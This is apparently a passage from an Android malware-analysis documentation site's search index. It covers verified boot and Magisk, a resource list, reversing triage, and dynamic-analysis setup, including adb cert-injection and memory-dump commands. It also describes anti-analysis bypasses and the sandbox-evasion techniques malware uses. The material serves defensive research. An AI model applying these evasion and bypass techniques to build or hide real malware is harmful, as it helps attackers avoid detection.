<li><code>magiskinit</code> loads the stock SELinux policy</li> <li><code>magiskinit</code> patches the policy in memory to inject the <code>magisk</code> domain with broad permissions</li> <li><code>magiskinit</code> sets up overlay mounts for read-only root filesystems</li> <li><code>magiskinit</code> executes the real <code>init</code> to continue normal boot</li> <li>The Magisk daemon starts as a system service, providing root access through the <code>magisk</code> domain</li> </ol>"},{"location":"platform-abuse/verified-boot/#systemless-root","title":"Systemless Root","text":"<p>Because Magisk only modifies the boot image ramdisk, the system and vendor partitions remain untouched and pass dm-verity verification. This \"systemless\" approach means:</p> <ul> <li>OTA updates can still be applied (the boot image may need re-patching afterward)</li> <li>SafetyNet/Play Integrity <code>ctsProfileMatch</code> can potentially pass with additional modules</li> <li>The root modification is contained to a single partition, simplifying reversal</li> </ul>"},{"location":"platform-abuse/verified-boot/#avbroot","title":"avbroot","text":"<p>avbroot takes a different approach: it patches full OTA images, re-signs all partitions with custom AVB keys, and can integrate Magisk or KernelSU into A/B OTA packages. This allows maintaining a fully verified boot chain (YELLOW state) with custom-signed images rather than the ORANGE state that standard Magisk produces.</p>"},{"location":"platform-abuse/verified-boot/#custom-rom-implications","title":"Custom ROM Implications","text":"<p>Running a custom ROM (LineageOS, GrapheneOS, CalyxOS) on an unlocked bootloader creates a specific security research environment:</p> Aspect Implication Root access Available through Magisk, KernelSU, or built-in su SELinux policy Custom policy may be more or less restrictive than stock Kernel source Available for modification, custom module loading dm-verity Typically disabled for the system partition OTA updates ROM-specific update mechanism, not OEM Play Integrity Fails <code>MEETS_DEVICE_INTEGRITY</code> without additional spoofing Bootloader state ORANGE (unlocked) or YELLOW (re-locked with custom keys, GrapheneOS) <p>GrapheneOS is notable for supporting re-locking the bootloader with custom keys on Pixel devices, achieving YELLOW boot state and enabling hardware-backed attestation for its own Auditor tool. This is the only aftermarket OS that maintains a verified boot chain comparable to the stock OS.</p>"},{"location":"platform-abuse/verified-boot/#offensive-relevance","title":"Offensive Relevance","text":""},{"location":"platform-abuse/verified-boot/#persistence-boundaries","title":"Persistence Boundaries","text":"<p>Verified Boot defines what survives across reboots:</p> <ul> <li>Locked bootloader, stock firmware: Only data partition modifications persist. Malware must operate within app sandbox constraints.</li> <li>Unlocked bootloader: Boot image modifications persist. Root access, custom kernels, and system modifications are possible.</li> <li>Supply chain compromise: System image modifications persist and are protected by verified boot. This is the most powerful persistence vector.</li> </ul>"},{"location":"platform-abuse/verified-boot/#exploit-chain-targets","title":"Exploit Chain Targets","text":"<p>A full firmware persistence exploit chain on a locked-bootloader device requires:</p> <ol> <li>A vulnerability to achieve code execution</li> <li>Privilege escalation to kernel or bootloader level</li> <li>A method to modify the boot image or system partition in a way that survives dm-verity</li> <li>Updating the vbmeta hash to match the modified partition (requires the OEM signing key or a bootloader vulnerability)</li> </ol> <p>Step 4 is the fundamental barrier. Without the OEM's private signing key, an attacker cannot produce a valid vbmeta signature for modified partitions. This is why supply chain attacks (compromising the OEM's build infrastructure) are the practical route to firmware persistence on locked devices.</p>"},{"location":"platform-abuse/verified-boot/#for-malware-analysis","title":"For Malware Analysis","text":"<p>When analyzing a sample, consider what boot state it expects:</p> <ul> <li>Malware targeting stock locked devices must operate entirely within the app sandbox and data partition</li> <li>Malware that modifies system files (like Triada firmware variants) requires supply chain access or an unlocked bootloader</li> <li>Samples that check <code>ro.boot.verifiedbootstate</code> or <code>ro.boot.flash.locked</code> are adapting behavior based on the device's integrity state</li> </ul>"},{"location":"platform-abuse/verified-boot/#cross-references","title":"Cross-References","text":"<ul> <li>SELinux policy integrity depends on verified boot protecting the policy files from modification</li> <li>Keystore key attestation includes the verified boot state in its certificate chain</li> <li>Play Integrity relies on the verified boot state as a primary signal for device integrity verdicts</li> <li>Triada is the primary example of firmware-level malware persistence protected by verified boot</li> <li>Persistence Techniques documents how malware persists within the constraints verified boot imposes</li> </ul>"},{"location":"resources/","title":"Resources","text":"<p>External resources for Android security research. Blogs, tools, frameworks, and link collections.</p>"},{"location":"resources/#blogs-research","title":"Blogs &amp; Research","text":""},{"location":"resources/#malware-research","title":"Malware Research","text":"Source Focus CheckPoint Research Android malware campaigns, Play Store threats, mobile APT tracking. Cleafy Labs Banking malware, financial fraud, mobile threat intelligence. Cyble CRIL Dark web intelligence, mobile malware sold on underground forums. Fortinet FortiGuard Android malware write-ups, mobile threat landscape. IBM Security Trusteer Mobile banking fraud, overlay attack research, financial malware analysis. Sophos X-Ops Cross-platform threat research including Android malware families. ThreatFabric Android banking trojans. Most prolific mobile malware research team. Trellix (FireEye) Advanced mobile threats, nation-state campaigns."},{"location":"resources/#vulnerability-research","title":"Vulnerability Research","text":"Source Focus 8kSec App and kernel-level Android security. Battlegrounds CTF. Google Android Offensive Security Kernel exploitation, Binder fuzzing, driver analysis from Google's red team. Google Project Zero 0-day research. Android exploit chains, Pixel vulnerabilities. NowSecure Blog Mobile app security testing, practical vulnerability analysis. Oversecured Blog Android app vulnerabilities. Systematic disclosure in Google, Samsung, TikTok apps. Top resource."},{"location":"resources/#vendor-security-blogs","title":"Vendor Security Blogs","text":"Source Focus Avast Decoded Android malware, adware campaign analysis. ESET WeLiveSecurity Android malware publications, regional threat analysis. Group-IB Blog Threat intelligence, fraud prevention, APT campaigns. Intel 471 Blog Underground marketplace monitoring, MaaS tracking. Kaspersky Securelist Mobile malware analysis, APT campaigns targeting Android. Lookout Threat Intelligence Mobile endpoint threats, surveillance software, state-sponsored spyware. McAfee Mobile Research Mobile malware, adware, PUPs. Part of McAfee Labs. NCC Group Research Offensive security research, Android malware lineage analysis. PRODAFT Blog Threat intelligence, underground infrastructure analysis. Trend Micro Blog Mobile ransomware, enterprise mobile threats. Zimperium Blog Mobile threat defense research, zero-day discoveries."},{"location":"resources/#platform-ecosystem","title":"Platform / Ecosystem","text":"Source Focus Android Developers Blog New API changes, security feature announcements. Android Security Bulletins Monthly CVE patches for Android. Google Security Blog Play Protect updates, platform security changes."},{"location":"resources/#frameworks-standards","title":"Frameworks &amp; Standards","text":"Resource What It Is bazaar.abuse.ch Malware sample database with multi-vendor tagging and YARA rule matching. Malpedia Malware reference database. Cross-vendor name mapping. MISP Galaxy Open threat intelligence knowledge base. Threat actors, malware families, tools, and ATT&amp;CK clusters. MITRE ATT&amp;CK Mobile Adversary technique taxonomy. High-level classification, not operational detail. OWASP MAS Mobile application security testing guide. Compliance-oriented. OWASP Mobile Top 10 Top 10 mobile security risks."},{"location":"resources/#tools","title":"Tools","text":""},{"location":"resources/#analysis-detection","title":"Analysis &amp; Detection","text":"Tool Purpose Androguard Python framework for Android app analysis APKiD Packer, protector, obfuscator identification APKLeaks Extract URLs, endpoints, and secrets from APK files dex2jar DEX to JAR conversion Droidlysis Automated Android malware property extraction (permissions, receivers, services) Drozer Android security assessment framework. IPC probing, provider testing. MobSF Automated mobile security analysis Quark Engine Android malware scoring and behavior analysis SUPER Secure, Unified, Powerful and Extensible Rust Android Analyzer VirusTotal Multi-engine malware scanning. 70+ AV engines. See Naming Conventions for detection name formats."},{"location":"resources/#device","title":"Device","text":"Tool Purpose LSPosed Xposed framework for modern Android Magisk Root management with detection bypass"},{"location":"resources/#network","title":"Network","text":"Tool Purpose Burp Suite HTTP/HTTPS proxy and traffic interception mitmproxy Scriptable HTTPS proxy"},{"location":"resources/#reverse-engineering","title":"Reverse Engineering","text":"Tool Purpose apktool APK disassembly and reassembly Bytecode Viewer Multi-decompiler view (Procyon, CFR, FernFlower, jadx side-by-side) Frida Dynamic instrumentation: hooking, tracing, modifying runtime behavior frida-dexdump Dump DEX files from packed apps at runtime Ghidra Native code reverse engineering (NSA, free) jadx DEX to Java decompiler medusa Extensible framework combining Frida scripts for Android dynamic analysis Objection Frida-powered runtime exploration reFrida Browser-based Frida IDE with Monaco editor, disassembler, memory search, Stalker tracing, and visual interceptor builder r2frida Radare2 + Frida integration radare2 Open-source reverse engineering framework"},{"location":"resources/#emulation-sandboxing","title":"Emulation &amp; Sandboxing","text":"Tool Purpose Android Emulator Official Android emulator with AVD manager Genymotion High-performance Android emulator for testing rootAVD Root Android Virtual Devices for Frida and dynamic analysis Cuckoo Droid Automated Android malware sandbox Joe Sandbox Mobile Commercial automated malware analysis sandbox"},{"location":"resources/#link-collections","title":"Link Collections","text":"Resource What It Is android-security-awesome Curated list of Android security tools and resources awesome-android-security Pentester and bug bounty focused links Awesome Android Reverse Engineering RE tools and techniques Awesome-Android-Vulnerability-Research Vulnerability research focused"},{"location":"resources/#periodic-reports","title":"Periodic Reports","text":"Report Publisher Cadence Financial Threat Report Kaspersky Securelist Annual Mobile Threat Landscape 2024 Kaspersky Securelist Annual Consumer Mobile Threat Report 2023 McAfee Labs Annual Mobile Threat Statistics Q1 2025 Kaspersky Securelist Quarterly Mobile Threat Statistics Q2 2025 Kaspersky Securelist Quarterly Mobile Threat Statistics Q3 2025 Kaspersky Securelist Quarterly ESET Threat Report H1 2024 ESET Semi-annual ESET Threat Report H2 2025 ESET Semi-annual Year in Review: 0-days Google Project Zero Annual Global Mobile Threat Report Zimperium Annual Mobile Banking Heists Report Zimperium Annual Mobile Threat Intelligence Report Lookout Annual Global Threat Landscape Report Fortinet Semi-annual"},{"location":"resources/#notable-research","title":"Notable Research","text":"<p>Key technical research publications from security teams. For vendor-specific malware analysis, see individual malware family pages.</p> Research Publisher Topic A 0-click exploit chain for the Pixel 9 (3-part series) Google Project Zero Dolby decoder integer overflow + kernel driver sandbox escape. 139-day patch gap. Bad Binder: Android In-The-Wild Exploit Google Project Zero CVE-2019-2215 Binder use-after-free. Linked to NSO Group's Pegasus. In-the-Wild Series: Android Exploits Google Project Zero Chrome RCE + Android n-day privilege escalation from watering hole. Multiple Internet-to-Baseband RCE in Exynos Modems Google Project Zero 18 zero-days in Samsung Exynos modems. 4 allow RCE with just a phone number. Samsung In-the-Wild Exploit Chain Google Project Zero Logic bugs exploited against Samsung devices. CVE-2021-25337, CVE-2021-25369, CVE-2021-25370. Analyzing a Modern In-the-Wild Android Exploit Google Project Zero CVE-2023-0266 (ALSA 0-day) + CVE-2023-26083 (Mali GPU 0-day). Commercial spyware. .NET MAUI Evasion McAfee Labs Malware using C#/.NET MAUI framework to bypass DEX-based analysis. Xamalicious Backdoor McAfee Labs Xamarin-based backdoor in 25 Google Play apps (327K downloads). Xamarin build process acts as packer hiding malicious code. SpyAgent OCR Crypto Theft McAfee Labs 280+ fake apps using image recognition to steal crypto wallet seed phrases from device photos. Invisible Adware McAfee Labs 43 Play Store apps (2.5M downloads) loading ads only when screen is off, weeks-long activation delay. India MaaS Phishing McAfee Labs MaaS platform with 800+ apps targeting Indian banking users, 3,700+ infected devices. Disclosure of 7 Android and Pixel Vulnerabilities Oversecured WebView file theft, Bluetooth permission bypass, VPN bypass, system component access. Two Weeks of Securing Samsung Devices Oversecured 60+ Samsung vulnerabilities. Path traversal via <code>Uri.getLastPathSegment()</code>, SMS database access. 20 Security Issues in Xiaomi Devices Oversecured Intent redirection, content provider, and privilege escalation in Xiaomi system apps. Exploiting Memory Corruption on Android Oversecured Native memory corruption via VirtualRefBasePtr. PayPal vulnerability example. Play Core Library Code Execution Oversecured Persistent code execution through dynamic module loading. Automated discovery. NGate: NFC Relay Attacks ESET First Android NFC relay malware. Clones payment cards via NFCGate for ATM cash withdrawal. EvilVideo: Telegram Zero-Day ESET Zero-day exploit for Telegram for Android. APKs disguised as video previews. Sold on underground forums. 525,600 Assessments: Top Mobile App Risks NowSecure 75% of apps have misconfigured crypto, 85% have SDK vulnerabilities, 1 in 5 has hardcoded keys. Dangerous Mobile App Permissions NowSecure Analysis of 378,000+ Android apps: 62% request dangerous permissions. AI-Assisted Decompilation NowSecure Using language models to optimize decompiled Android app code."},{"location":"resources/#conference-talks","title":"Conference Talks","text":"<p>Notable Android security presentations from major conferences.</p>"},{"location":"resources/#black-hat-def-con","title":"Black Hat / DEF CON","text":"Talk Speaker Event Topic Android Packers: Separating from the Pack Maddie Stone Black Hat USA 2020 Packer identification, unpacking methodology, APKiD development Strandhogg: Attacking Android Through Task Affinity Promon Research DEF CON 27 Task affinity hijacking (CVE-2020-0096), UI spoofing Breaking Secure Messaging on Android Various Black Hat USA 2023 Accessibility-based message exfiltration from E2E encrypted apps The Art of Android Malware Analysis Various Black Hat USA 2024 Modern banking trojan analysis, ATS reverse engineering Pixel 0-Click Exploit Chain Google Project Zero Associated research Dolby decoder overflow + kernel sandbox escape on Pixel 9"},{"location":"resources/#hitb-offensivecon-other","title":"HITB / OffensiveCon / Other","text":"Talk Speaker Event Topic Breaking Android's Verified Boot Various HITB AVB bypass, bootloader exploitation, firmware persistence Frida for Android Malware Analysis Eduardo Novella Various Dynamic instrumentation for banking trojan analysis DexProtector Internals Romain Thomas Associated research vtable hooking, asset encryption, native bridge analysis"},{"location":"resources/#youtube-channels","title":"YouTube Channels","text":"Channel Focus Notable Content LaurieWired Android malware analysis, reverse engineering Malware deep-dives, assembly analysis, practical RE walkthroughs 8kSec Mobile security research Android kernel exploitation, app security testing Maddie Stone 0-day research, Android exploitation Google Project Zero research presentations stacksmashing Hardware hacking, reverse engineering Hardware-adjacent Android security, Flipper Zero integration John Hammond General security, CTF walkthroughs Occasional mobile security and malware analysis content IppSec HTB walkthroughs Android challenge walkthroughs and mobile exploitation Corellium Mobile security platform Android reverse engineering tutorials, virtualization-based analysis"},{"location":"resources/#training-platforms","title":"Training Platforms","text":"Platform Description 8kSec Battlegrounds Free mobile security challenges (CTF-style). Android challenges include deep link exploitation, client-side bypass, malicious app creation. Community writeups available. OWASP MASTG Test Apps Standardized vulnerable Android and iOS apps for practicing MASVS testing. OVAA Oversecured Vulnerable Android App. Practice exploiting common Android vulnerabilities. InsecureBankv2 Vulnerable banking app for practicing common Android app vulnerabilities. DIVA Damn Insecure and Vulnerable App. Covers 13 common Android vulnerability categories. AndroGoat Open-source vulnerable Android app for practicing OWASP Top 10 Mobile risks. hpAndro Kotlin-based vulnerable app with multiple challenge categories."},{"location":"resources/#courses","title":"Courses","text":"Course Provider Notes SEC575: Mobile Device Security and Ethical Hacking SANS Comprehensive mobile security course covering Android and iOS. GMOB certification. Android App Security with Frida 8kSec Focused on dynamic instrumentation for Android app testing and malware analysis. Mobile Application Penetration Testing INE/eLearnSecurity Covers Android and iOS pentesting methodology. eMAPT certification. Android Security Internals Various (Udemy) Budget-friendly courses on Android RE fundamentals."},{"location":"resources/#ctf-resources","title":"CTF Resources","text":""},{"location":"resources/#android-specific-ctfs","title":"Android-Specific CTFs","text":"Platform Description 8kSec Battlegrounds Dedicated mobile security CTF with Android challenges MOBISEC University of California course with Android security challenges (public materials) Android CTF by BSides Open-source Android security challenges Injured Android CTF-style vulnerable Android app with progressive difficulty"},{"location":"resources/#ctf-writeup-collections","title":"CTF Writeup Collections","text":"Resource Content CTFtime Mobile Challenges Filter by \"mobile\" tag for Android-specific writeups from global CTF events HackTricks Android Android pentesting methodology used in CTF contexts"},{"location":"resources/#community","title":"Community","text":""},{"location":"resources/#forums-and-chat","title":"Forums and Chat","text":"Platform Description Android Security subreddit Discussion of Android vulnerabilities, patches, and research Mobile Hacking Discord Community server for mobile security researchers Frida Discord Official Frida community for dynamic instrumentation help OWASP Slack #mobile-security OWASP community channel for mobile security discussion"},{"location":"resources/#bug-bounty-programs","title":"Bug Bounty Programs","text":"Program Scope Max Payout Google VRP Android OS, Pixel devices, Google apps $1,000,000 for full exploit chains. Up to $15,000 for critical single bugs. Google Mobile VRP First-party Android apps (Google, Fitbit, Waymo, Waze) $30,000 for RCE without interaction. $7,500 for sensitive data theft. Samsung Mobile Security Rewards Samsung mobile devices, Knox, Galaxy Store Up to $1,000,000 for critical chain on flagship devices Qualcomm Bug Bounty Snapdragon chipsets, modem firmware Varies; covers baseband and TEE vulnerabilities HackerOne Mobile Programs Various mobile app vendors Varies by program; filter by \"mobile\" scope"},{"location":"resources/#researchers-to-follow","title":"Researchers to Follow","text":"Researcher Affiliation Focus Maddie Stone Google Project Zero Android 0-days, exploit chains, packer analysis Sergey Toshin Oversecured Android app vulnerabilities, systematic vuln discovery Lukas Stefanko ESET Android malware tracking, Play Store threats Federico Valentini / Alessandro Strino Cleafy Banking trojan analysis, ATS research Cengiz Han Sahin ThreatFabric Android banking malware naming and tracking"},{"location":"reversing/","title":"Reversing","text":"<p>Practical methodology for reversing Android applications, from initial triage to full unpacking. Each page covers the approach, tools, and target-specific techniques for defeating protections.</p>"},{"location":"reversing/#methodology","title":"Methodology","text":"Approach When to Use Static Analysis First pass on any APK: manifest review, decompilation, string extraction, identifying protections Dynamic Analysis Runtime behavior observation: tracing API calls, monitoring file/network activity, capturing decrypted payloads Hooking Intercepting and modifying function calls at runtime using Frida, Xposed, or native hooks Patching Modifying APK or DEX bytecode: disabling checks, injecting instrumentation, repackaging Network Analysis Intercepting C2 traffic: proxy setup, SSL pinning bypass, protocol identification, exfiltration channel mapping Development Frameworks Identifying and reversing cross-platform apps: React Native, Flutter, Xamarin, Unity, Cordova, and others"},{"location":"reversing/#triage-workflow","title":"Triage Workflow","text":"<p>When a new sample arrives, follow this sequence to identify what you're dealing with before deep-diving:</p> <pre><code>1. Static triage\n   - File hashes (MD5, SHA-256) for VT/MalwareBazaar lookup\n   - AndroidManifest.xml: permissions, components, intent filters\n   - strings / grep for URLs, IPs, API keys, crypto constants\n   - Identify packer (APKiD or manual native lib inspection):\n     Virbox, DexGuard, DexProtector, Tencent Legu, 360 Jiagu,\n     Bangcle, AppSealing, LIAPP, Appdome, zShield, Verimatrix,\n     Arxan, Promon, or custom packer\n   - Identify framework: check for React Native, Flutter, Xamarin,\n     Unity, Cordova indicators (see Development Frameworks page)\n\n2. If packed: unpack first\n   - Chinese packers (Tencent Legu, 360 Jiagu, Bangcle): memory dump via Frida (DexClassLoader hook)\n   - DexGuard: string decryption hooks, class name deobfuscation\n   - Virbox: native unpacking from libvdog.so\n   - AppSealing: AppPealing Xposed module or Frida kill/signal/alarm hooks\n   - LIAPP: frida-dexdump on physical device, server-side token replay\n   - Appdome: layered bypass (anti-debug, anti-root, anti-Frida, SSL)\n   - zShield: XXTEA ELF unpacker for native libs, .szip DEX extraction\n   - Verimatrix: decrypt libencryption_*.so, handle inlined string decryption\n   - Arxan: guard network mapping with Frida Stalker, Ghidra + D-810\n   - Promon: RASP bypass via Shamiko + ZygiskFrida on physical device\n   - DexProtector: white-box crypto analysis, native bridge hooks\n   - See Packers section for family-specific techniques\n\n3. Identify framework (if not native Android)\n   - React Native: extract and beautify JS bundle or decompile Hermes bytecode\n   - Flutter: run blutter against libapp.so for Dart symbol recovery\n   - Xamarin: decompile assemblies/*.dll with dnSpy/ILSpy\n   - Unity: Il2CppDumper for IL2CPP, dnSpy for Mono backend\n   - Cordova: all logic in assets/www/ as readable JavaScript\n   - See Development Frameworks page for full detection and analysis\n\n4. Decompile and analyze\n   - JADX for Java/Smali, Ghidra/IDA for native libs\n   - Map class structure: identify C2 handler, command dispatcher, payload classes\n   - Extract encryption keys, C2 URLs, target app lists\n\n5. Dynamic validation\n   - Run in emulator or physical device with proxy\n   - Capture C2 registration and first beacon\n   - Trigger key behaviors: overlay injection, accessibility activation, data exfiltration\n   - Hook crypto functions to capture plaintext C2 traffic\n\n6. Network capture\n   - Set up proxy (Burp/mitmproxy) with SSL pinning bypass\n   - Map API endpoints and command protocol\n   - Identify exfiltration channels and data format\n   - Extract IOCs: domains, IPs, paths, bot IDs\n</code></pre> <p>Physical device strongly preferred</p> <p>LIAPP, Appdome, Arxan, DexProtector, and Promon all aggressively detect emulators and virtual environments. Use a rooted Pixel with Magisk + Zygisk + Shamiko + ZygiskFrida for these protectors. Chinese packers, AppSealing, DexGuard, and Verimatrix are generally workable in emulators with basic evasion.</p>"},{"location":"reversing/#framework-identification","title":"Framework Identification","text":"<p>Before diving into decompilation, determine whether the app was built with a cross-platform framework. The framework dictates the entire toolchain -- a Flutter app has zero useful DEX code, and a Cordova app stores all logic as plaintext JavaScript.</p> Framework Quick Indicator Analysis Approach React Native <code>assets/index.android.bundle</code>, <code>libhermes.so</code> or <code>libjsc.so</code> Decompile Hermes bytecode or beautify JS bundle Flutter <code>libflutter.so</code>, <code>libapp.so</code> Run blutter for Dart AOT symbol recovery, Ghidra for native analysis Xamarin / .NET MAUI <code>assemblies/*.dll</code>, <code>libmonosgen-2.0.so</code> Decompile .NET DLLs with dnSpy or ILSpy Unity (IL2CPP) <code>libil2cpp.so</code>, <code>global-metadata.dat</code> Il2CppDumper for metadata extraction, Ghidra for native code Unity (Mono) <code>assets/bin/Data/Managed/*.dll</code> dnSpy decompilation of Assembly-CSharp.dll Cordova / Ionic <code>assets/www/index.html</code>, <code>assets/www/cordova.js</code> Read JavaScript directly, beautify if minified Godot <code>libgodot_android.so</code>, <code>assets/*.pck</code> gdsdecomp for .pck extraction, GDScript recovery B4A <code>anywheresoftware.b4a.*</code> classes Standard jadx decompilation, fully readable Kivy (Python) <code>libpython*.so</code>, <code>libSDL2.so</code>, <code>org.kivy.*</code> Extract and decompile Python bytecode (.pyc) Qt <code>libQt5Core_*.so</code> or <code>libQt6Core_*.so</code> Ghidra/IDA for native C++, QML files may be readable <p>28 frameworks documented with detection scripts, individual analysis workflows, SSL pinning bypass methods, and hooking strategies. See Development Frameworks for the complete reference.</p>"},{"location":"reversing/#environment-setup","title":"Environment Setup","text":""},{"location":"reversing/#recommended-lab-configuration","title":"Recommended Lab Configuration","text":"Component Option A (Physical) Option B (Emulated) Device Rooted Pixel (Magisk) Android Studio AVD or Genymotion Android version Match target's <code>minSdkVersion</code> API 28-33 covers most samples Root Magisk + Zygisk Built-in root (AVD) Frida frida-server on device frida-server on emulator Proxy Burp Suite / mitmproxy on host Same, bridge networking Network isolation Dedicated Wi-Fi AP or VLAN NAT with host proxy <p>Physical devices are preferred for samples with emulator detection (most banking trojans). Emulators work for initial triage and samples without anti-emulation.</p>"},{"location":"reversing/#anti-analysis-checks","title":"Anti-Analysis Checks","text":"<p>Most modern banking trojans implement multiple anti-analysis checks. Know what to expect:</p> Check What It Detects Bypass Root detection Magisk, su binary, root management apps MagiskHide / Shamiko, Frida hook Emulator detection Build properties, sensors, telephony Frida property spoofing, physical device Frida detection Port 27042, process name, <code>/proc/self/maps</code> Rename binary, non-default port, Magisk module Debugger detection <code>Debug.isDebuggerConnected()</code>, TracerPid Frida hook, Smali patch VPN/proxy detection Network interface checks, proxy settings Transparent proxy via iptables Geofencing SIM country, locale, timezone, IP geolocation Frida spoof, Smali patch Google Play Services SafetyNet/Play Integrity attestation Magisk modules (Play Integrity Fix) <p>For packer-specific protections and bypass techniques, see Packers. Individual packer pages document their anti-Frida, anti-root, and anti-emulator implementations along with targeted bypass methods.</p>"},{"location":"reversing/#cross-references","title":"Cross-References","text":"<p>Target-specific reversing (e.g., unpacking Virbox, bypassing anti-debug) is documented in the relevant Packers and Attack Techniques pages. Individual malware family pages include reversing notes specific to each family's protections. The Development Frameworks page covers framework detection, tooling, and analysis workflows for React Native, Flutter, Xamarin, Unity, Cordova, and other cross-platform technologies.</p>"},{"location":"reversing/dynamic-analysis/","title":"Dynamic Analysis","text":"<p>Running the app and observing its behavior at runtime. Bypasses packing and obfuscation since the code must decrypt itself to execute. Captures network traffic, API calls, file operations, and runtime behavior that static analysis cannot reveal.</p>"},{"location":"reversing/dynamic-analysis/#setup","title":"Setup","text":""},{"location":"reversing/dynamic-analysis/#environment-options","title":"Environment Options","text":"Environment Pros Cons Physical device (rooted) No emulator detection, real hardware Risk to personal data, device may get locked by ransomware Android emulator (stock) Easy to snapshot/restore, free Detected by most malware Genymotion Better hardware simulation Still detectable, commercial Custom AOSP build Can disable detection checks at framework level Complex setup <p>For malware analysis, a rooted physical device with a clean image is ideal. Use a dedicated device with no personal data.</p>"},{"location":"reversing/dynamic-analysis/#root-access","title":"Root Access","text":"<p>Root is needed for:</p> <ul> <li>Frida server execution</li> <li>Network traffic interception (iptables, cert injection)</li> <li>File system access to app private directories</li> <li>Process tracing (strace, ltrace)</li> </ul> <p>Options: Magisk (recommended, supports MagiskHide/Zygisk for detection bypass), KernelSU, or engineering builds. For emulator-based analysis, 8kSec's emulator rooting guide provides a step-by-step walkthrough using rootAVD to enable root access on Android Virtual Devices for Frida server and dynamic analysis without a physical device.</p>"},{"location":"reversing/dynamic-analysis/#network-interception","title":"Network Interception","text":"<p>Configure proxy for HTTP/HTTPS traffic:</p> <pre><code>adb shell settings put global http_proxy &lt;proxy_ip&gt;:&lt;port&gt;\n</code></pre> <p>For HTTPS, install the proxy CA certificate as a system cert (requires root on Android 7+):</p> <pre><code># Convert cert to Android format\nopenssl x509 -inform PEM -subject_hash_old -in burp-ca.pem | head -1\n# Result: 9a5ba575\ncp burp-ca.pem 9a5ba575.0\nadb push 9a5ba575.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0\n</code></pre> <p>On Android 14+, system cert injection requires mounting the cert store differently due to read-only system partition changes.</p> <p>For apps with certificate pinning, see Hooking for Frida-based bypass.</p>"},{"location":"reversing/dynamic-analysis/#runtime-observation","title":"Runtime Observation","text":""},{"location":"reversing/dynamic-analysis/#logcat","title":"Logcat","text":"<p>Android's system log captures app output, exceptions, and system events:</p> <pre><code>adb logcat --pid=$(adb shell pidof com.target.app)\n</code></pre> <p>Filter for useful information:</p> <pre><code>adb logcat | grep -E \"(http|url|key|token|password|error|exception)\" -i\n</code></pre> <p>Malware authors often leave debug logging in release builds.</p>"},{"location":"reversing/dynamic-analysis/#process-and-file-monitoring","title":"Process and File Monitoring","text":"<pre><code># Watch file system changes\nadb shell inotifywait -m /data/data/com.target.app/\n\n# Monitor network connections\nadb shell netstat -anp | grep &lt;pid&gt;\n\n# Trace system calls\nadb shell strace -p &lt;pid&gt; -e trace=network,file\n</code></pre>"},{"location":"reversing/dynamic-analysis/#dumping-decrypted-dex","title":"Dumping Decrypted DEX","text":"<p>For packed apps, the real DEX is decrypted in memory at runtime. Capture it:</p> <p>Using Frida (see Hooking):</p> <p>Hook <code>DexFile</code> or <code>InMemoryDexClassLoader</code> to dump DEX bytes when they're loaded.</p> <p>Using /proc/maps:</p> <pre><code>adb shell su -c \"cat /proc/&lt;pid&gt;/maps\" | grep dex\nadb shell su -c \"dd if=/proc/&lt;pid&gt;/mem bs=1 skip=&lt;offset&gt; count=&lt;size&gt; of=/sdcard/dumped.dex\"\n</code></pre> <p>Using fridump or similar memory dumping tools.</p> <p>Once dumped, the DEX can be analyzed with jadx like an unpacked app.</p>"},{"location":"reversing/dynamic-analysis/#traffic-analysis","title":"Traffic Analysis","text":"<p>Beyond proxy interception:</p> <ul> <li>Wireshark/tcpdump for non-HTTP protocols</li> <li>mitmproxy for programmatic traffic manipulation</li> <li>If the app uses certificate pinning, bypass it first via Frida (see Hooking)</li> <li>Check for non-standard ports, raw socket communication, DNS-based C2</li> </ul>"},{"location":"reversing/dynamic-analysis/#anti-analysis-detection","title":"Anti-Analysis Detection","text":"<p>Malware commonly checks for analysis environments:</p> Check What It Detects <code>Build.FINGERPRINT</code> contains \"generic\" Emulator <code>/system/bin/su</code> exists Root Magisk package present Root (Magisk) Frida port 27042 open Frida server <code>/proc/self/maps</code> contains \"frida\" Frida injection <code>Settings.Global.ADB_ENABLED</code> USB debugging Low sensor count Emulator Battery always charging Emulator No SIM / IMEI all zeros Emulator <p>Bypassing these checks is covered in Hooking (return fake values) and Patching (remove checks from code).</p>"},{"location":"reversing/dynamic-analysis/#sandbox-evasion","title":"Sandbox Evasion","text":"<p>Beyond simple environment fingerprinting, malware employs behavioral evasion that specifically targets automated sandbox analysis:</p> Technique How It Works Examples Time-based delays Payload activates only after N days post-install, or sleeps for extended periods before executing malicious code Anatsa delays payload delivery until user activity is detected Interaction gating Requires real user gestures (taps, scrolls, swipes) before triggering malicious behavior; sandbox bots rarely generate realistic touch events Overlay injection only activates after detecting scroll events on a target banking app Network environment checks Validates presence of real cellular data (MCC/MNC codes), rejects Wi-Fi-only or VPN connections typical of sandboxes Checks <code>TelephonyManager.getNetworkOperator()</code> for valid carrier codes Locale and SIM validation Verifies device locale, timezone, SIM operator, and country code match a target region before activating MoqHao targets specific country codes; deactivates outside target regions Installed app enumeration Checks for specific banking or financial apps before deploying overlays; sandboxes rarely have these installed Calls <code>PackageManager.getInstalledPackages()</code> looking for target apps from its overlay list Sensor validation Reads accelerometer, gyroscope, or GPS data to confirm a real device with physical movement Checks <code>SensorManager</code> for realistic sensor event streams that emulators cannot produce <p>Countering sandbox evasion during analysis: use a physical device with a real SIM card in the target region, install target banking apps (empty accounts), interact naturally with the device, and set the system clock forward if time-based delays are suspected.</p>"},{"location":"reversing/dynamic-analysis/#api-monitoring","title":"API Monitoring","text":"<p>Key Android APIs to monitor during dynamic analysis, grouped by the capability they indicate:</p> API Capability What to Watch For <code>ContentResolver.query()</code> on contacts/SMS/call log URIs Data theft Bulk reads of <code>content://sms</code>, <code>content://contacts</code>, <code>content://call_log</code> <code>MediaRecorder</code> / <code>MediaProjection</code> Screen recording <code>createVirtualDisplay()</code> calls, screen capture buffer access <code>Camera</code> / <code>AudioRecord</code> Surveillance Camera preview callbacks, audio buffer reads without visible UI <code>PackageManager.getInstalledPackages()</code> Target app enumeration Iterating installed packages to match against overlay target lists <code>AccessibilityService</code> callbacks Device control <code>onAccessibilityEvent()</code> handling, <code>performAction()</code> calls for automated clicks/input <code>Socket</code> / <code>HttpURLConnection</code> / <code>OkHttpClient</code> C2 communication Outbound connections, request/response bodies, custom headers <code>TelephonyManager</code> methods Device fingerprinting IMEI, phone number, SIM operator, network operator reads <code>KeyStore</code> / <code>Cipher</code> Cryptographic operations Key generation, encryption/decryption of C2 payloads or stolen data <code>Runtime.exec()</code> / <code>ProcessBuilder</code> Command execution Shell commands for root checks, 